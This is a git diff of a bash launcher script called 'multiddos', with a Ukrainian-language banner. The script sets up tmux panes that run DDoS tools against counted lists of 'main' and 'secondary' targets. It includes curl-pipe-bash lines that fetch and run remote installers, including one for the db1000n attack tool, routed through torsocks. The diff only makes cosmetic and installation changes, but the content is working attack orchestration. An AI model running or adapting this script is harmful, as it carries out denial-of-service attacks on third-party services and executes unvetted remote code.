@@ -1,6 +1,9 @@
 #!/bin/bash
 # curl -L tiny.one/multiddos | bash && tmux a
 
+sudo apt-get update -qq -y
+sudo apt-get install -qq -y xdotool toilet
+
 cd ~
 rm -rf multidd
 mkdir multidd
@@ -66,15 +69,14 @@ toilet -t --metal "   жнець"
 toilet -t --metal " MULTIDDOS"
 xdotool type --delay 100 "Шукаю завдання..."
 sleep 1
-
-xdotool type --delay 100 " Знайшов!"
+xdotool type --delay 100 " знайшов!"
 echo -e "\n"
-sleep 2
-echo -e "                         Secondary targets:" "\x1b[32m $(cat $sec_targets | sort | uniq | wc -l)\x1b[m"
-echo -e "                         Main targets:     " "\x1b[32m $(cat $main_targets | sort | uniq | wc -l)\x1b[m"
-echo -e "                         Total:            " "\x1b[32m $(expr $(cat $sec_targets | sort | uniq | wc -l) + $(cat $main_targets | sort | uniq | wc -l))\x1b[m"
+sleep 1
+echo -e "Secondary targets:" "\x1b[32m $(cat $sec_targets | sort | uniq | wc -l)\x1b[m"
+echo -e "Main targets:     " "\x1b[32m $(cat $main_targets | sort | uniq | wc -l)\x1b[m"
+echo -e "Total:            " "\x1b[32m $(expr $(cat $sec_targets | sort | uniq | wc -l) + $(cat $main_targets | sort | uniq | wc -l))\x1b[m"
 
-echo -e "\nLoading..."
+echo -e "\nЗавантаження..."
 sleep 5
 }
 
@@ -84,8 +86,7 @@ prepare_targets_and_banner
 
 clear
 # sudo apt install docker.io gcc libc-dev libffi-dev libssl-dev python3-dev rustc -qq -y 
-sudo apt-get update -q -y
-sudo apt-get install -q -y xdotool tmux vnstat toilet torsocks python3 python3-pip
+sudo apt-get install -q -y tmux  python3 python3-pip
 pip install --upgrade pip
 
 launch () {
@@ -115,11 +116,13 @@ else
 fi
 
 if [[ $vnstat == "on" ]]; then
+sudo apt install vnstat
 sleep 0.2
 tmux split-window -v 'vnstat -l'
 fi
 
 if [[ $db1000n == "on" ]]; then
+sudo apt -yq install torsocks
 sleep 0.2
 tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
 #tmux split-window -v 'docker run --rm -it --pull always ghcr.io/arriven/db1000n'
